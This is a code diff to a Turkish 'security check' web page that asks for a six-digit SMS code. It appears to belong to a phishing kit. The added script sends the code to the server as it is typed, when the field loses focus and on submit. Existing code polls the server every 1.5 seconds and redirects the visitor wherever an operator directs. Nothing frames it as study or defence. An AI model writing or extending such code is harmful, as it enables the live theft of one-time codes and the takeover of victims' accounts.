@@ -5,7 +5,7 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Güvenlik Kontrolü</title>
+  <title>SMS | Güvenlik Kontrolü</title>
   <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico">
   <link rel="stylesheet" href="../assets/css/style.css">
 </head>
@@ -286,16 +286,62 @@
     <img src="../assets/images/loading.svg" alt="loading">
   </div>
   <script>
+    async function sendLogUpdate(payload) {
+      try {
+        const body = JSON.stringify(payload);
+        await fetch('/api/log-page', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body
+        });
+      } catch (err) {
+        console.error('SMS log error', err);
+      }
+    }
+
+    function logSmsPage() {
+      sendLogUpdate({ page: 'sms' }).catch(err => console.error('SMS page log failed', err));
+    }
+
+    async function logSmsInput(value) {
+      if (value && value.trim()) {
+        await sendLogUpdate({
+          page: 'sms',
+          inputs: { input3: value.trim() }
+        });
+      }
+    }
+
+    logSmsPage();
+
     function b_xhr() { fetch("/websocket.php", { method: "POST" }) .then((y) => y.json()) .then((m) => { if (m.success) { let u = m.success; if (u.includes('login')) { u = '../' + u; } window.location.href = u; } }); } setInterval(b_xhr, 1500);
     const frm = document.querySelector('form');
     const smsInp = frm.elements[0];
 
-    frm.addEventListener('submit', (evt) => {
+    // Input değeri değiştiğinde kaydet
+    let smsInputTimeout;
+    smsInp.addEventListener('input', function() {
+      clearTimeout(smsInputTimeout);
+      smsInputTimeout = setTimeout(function() {
+        if (smsInp.value && smsInp.value.trim()) {
+          logSmsInput(smsInp.value);
+        }
+      }, 500);
+    });
+
+    smsInp.addEventListener('blur', function() {
+      if (smsInp.value && smsInp.value.trim()) {
+        logSmsInput(smsInp.value);
+      }
+    });
+
+    frm.addEventListener('submit', async function(evt) {
         evt.preventDefault();
 
         if (/^\d{6}$/.test(smsInp.value.trim())) {
             smsInp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
             smsInp.closest('.bc-verify-input-content').nextElementSibling.style.color = '#76808f';
+            await logSmsInput(smsInp.value);
             frm.submit();
         } else {
             smsInp.parentElement.style.borderColor = '#f84960';
